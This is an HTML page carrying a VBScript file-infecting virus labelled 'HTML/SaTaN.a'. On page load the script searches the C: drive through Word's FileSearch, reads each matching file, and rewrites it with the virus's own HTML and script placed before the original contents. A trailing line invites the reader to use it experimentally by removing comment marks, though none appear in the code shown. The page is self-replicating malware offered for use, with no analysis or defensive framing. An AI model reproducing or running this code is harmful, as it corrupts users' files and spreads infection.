<html><!--HTML/SaTaN.a-->
<body>
<SCRIPT language=vbscript>
Sub Window_OnLoad()
Call Bomb
End Sub
Sub Bomb()
Set FLSysObj = CreateObject("Scripting.FileSystemObject")
Set wordobj = CreateObject("Word.application")
Set FLSrch = wordobj.Application.FileSearch
FLSrch.NewSearch
FLSrch.LookIn = "C:\"
FLSrch.SearchSubFolders = True
FLSrch.FileName = "*.aaa*"
FLSrch.Execute
For t = 1 To FLSrch.FoundFiles.Count
Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)
f = InFX.readline
InFX.Close
If f <> "<html><!--HTML/SaTaN.a-->" Then
Set TxtRng = Document.body.createTextRange
Set Devolve = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)
Contents = Devolve.readall
Devolve.Close
Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)
Kry.writeline "<html><!--HTML/SaTaN.a-->"
Kry.writeline "<body>"
Kry.writeline TxtRng.HTMLText
Kry.writeline "</body>"
Kry.writeline "</html>"
Kry.writeline Contents
Kry.Close
End If
Next
wordobj.Quit
End Sub
</SCRIPT>
</body>
</html>
To use this, experementially, remove the ' comment marks 